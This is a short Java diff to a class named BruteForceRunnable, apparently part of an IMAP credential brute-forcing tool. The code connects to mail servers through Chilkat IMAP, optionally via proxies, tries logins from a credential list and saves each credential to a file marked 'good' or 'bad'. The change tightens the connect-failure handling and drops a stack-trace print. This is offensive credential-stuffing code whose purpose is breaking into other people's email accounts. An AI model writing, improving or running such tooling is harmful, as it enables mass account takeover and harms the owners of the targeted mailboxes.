@@ -69,13 +69,9 @@ public class BruteForceRunnable implements Runnable
                 ckImap.put_Ssl(connection.isSsl());
                 ckImap.put_StartTls(connection.isTls());
 
-                if (useProxies && isFailedToConnect(ckImap, connection.getHost()))
+                if ((useProxies && isFailedToConnect(ckImap, connection.getHost())) || (!ckImap.Connect(connection.getHost())))
                 {
                     break;
-                }
-                else
-                {
-                    ckImap.Connect(connection.getHost());
                 }
 
                 FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
@@ -86,7 +82,6 @@ public class BruteForceRunnable implements Runnable
         }
         catch (final IOException ioException)
         {
-            ioException.printStackTrace();
             bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, message: %s", ioException.getMessage()));
         }
 
